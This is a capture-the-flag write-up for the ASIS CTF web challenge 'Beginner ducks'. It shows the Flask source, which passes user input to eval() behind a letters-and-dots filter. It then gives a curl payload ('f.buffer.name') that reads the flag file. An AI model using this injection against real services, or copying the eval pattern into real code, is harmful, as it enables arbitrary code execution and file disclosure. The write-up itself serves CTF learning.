---
description: WEB | 37 pts - 176 solves
---

# Beginner ducks

> Description: Hiiiii, welcome to ASIS CTF. We have ducks. Check them out http://ducks.asisctf.com:8000/. Download source-code from here.

Source code:

```python
#!/usr/bin/env python3
from flask import Flask,request,Response
import random
import re

app = Flask(__name__)
availableDucks = ['duckInABag','duckLookingAtAHacker','duckWithAFreeHugsSign']
indexTemplate = None
flag = None

@app.route('/duck')
def retDuck():
	what = request.args.get('what')
	duckInABag = './images/e146727ce27b9ed172e70d85b2da4736.jpeg'
	duckLookingAtAHacker = './images/591233537c16718427dc3c23429de172.jpeg'
	duckWithAFreeHugsSign = './images/25058ec9ffd96a8bcd4fcb28ef4ca72b.jpeg'

	if(not what or re.search(r'[^A-Za-z\.]',what)):
		return 'what?'

	with open(eval(what),'rb') as f:
		return Response(f.read(), mimetype='image/jpeg')

@app.route("/")
def index():
	return indexTemplate.replace('WHAT',random.choice(availableDucks))

with open('./index.html') as f:
	indexTemplate = f.read() 
with open('/flag.txt') as f:
	flag = f.read()

if(__name__ == '__main__'):
	app.run(port=8000)
```

It's clear that this `eval()` is dangerous, since it'll execute the python code that we pass to the `?what` parameter and return the result in the response. We can verify the vulnerability by running the code locally and passing to it the variable `duckInABag`, which evaluates to: `'./images/e146727ce27b9ed172e70d85b2da4736.jpeg'`, so code will be:

```python
	with open('./images/e146727ce27b9ed172e70d85b2da4736.jpeg','rb') as f:
		return Response(f.read(), mimetype='image/jpeg')
```

and therefore show us the image.\
There's some input filtering with the regex: `[^A-Za-z\.]`; it will only accept letters and the dot symbol. So how can we read `/flag.txt` if `/` isn't allowed?\
We can try to read the file descriptor properties. i.e: `f.buffer.name` will evaluate to: `/flag.txt`.

```shell
$ curl http://ducks.asisctf.com:8000/duck?what=f.buffer.name
ASIS{run-away-ducks-are-coming-🦆🦆}
```
